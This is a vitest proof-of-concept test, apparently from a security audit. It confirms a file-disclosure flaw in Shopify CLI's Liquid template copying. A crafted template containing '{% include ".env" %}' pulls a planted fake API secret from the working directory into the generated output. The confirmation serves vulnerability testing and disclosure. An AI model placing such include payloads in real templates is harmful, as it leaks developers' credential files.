import {expect, test} from 'vitest'
import {mkdtemp, mkdir, readFile, writeFile} from 'node:fs/promises'
import {tmpdir} from 'node:os'
import {dirname, join} from 'node:path'
import {fileURLToPath} from 'node:url'
import {recursiveLiquidTemplateCopy} from '@shopify/cli-kit/node/liquid'

const findingDir = dirname(fileURLToPath(import.meta.url))
const evidenceDir = join(findingDir, 'evidence')
const observationPath = join(evidenceDir, 'confirm-test-observation.json')

test('test_confirm_p10_liquid_template_root_file_disclosure_nosessid', async () => {
  await mkdir(evidenceDir, {recursive: true})
  const workDir = await mkdtemp(join(tmpdir(), 'piolium-liquid-confirm-'))
  const victimCwd = join(workDir, 'victim-cwd')
  const templateDir = join(workDir, 'malicious-template')
  const outputDir = join(workDir, 'generated-app')
  await mkdir(victimCwd, {recursive: true})
  await mkdir(templateDir, {recursive: true})
  const marker = `PIOLIUM_LIQUID_CONFIRM_${Date.now()}`
  await writeFile(join(victimCwd, '.env'), `SHOPIFY_API_SECRET=${marker}\n`)
  await writeFile(join(templateDir, 'leaked-env.txt.liquid'), '{% include ".env" %}')

  const originalCwd = process.cwd()
  try {
    process.chdir(victimCwd)
    await recursiveLiquidTemplateCopy(templateDir, outputDir, {})
  } finally {
    process.chdir(originalCwd)
  }

  const generatedPath = join(outputDir, 'leaked-env.txt')
  const generated = await readFile(generatedPath, 'utf8')
  await writeFile(
    observationPath,
    JSON.stringify(
      {
        finding: 'p10-liquid-template-root-file-disclosure',
        victimCwd,
        templateFile: join(templateDir, 'leaked-env.txt.liquid'),
        generatedPath,
        marker,
        generated,
        confirmed: generated.includes(marker),
      },
      null,
      2,
    ),
  )

  expect(generated).toContain(marker)
})
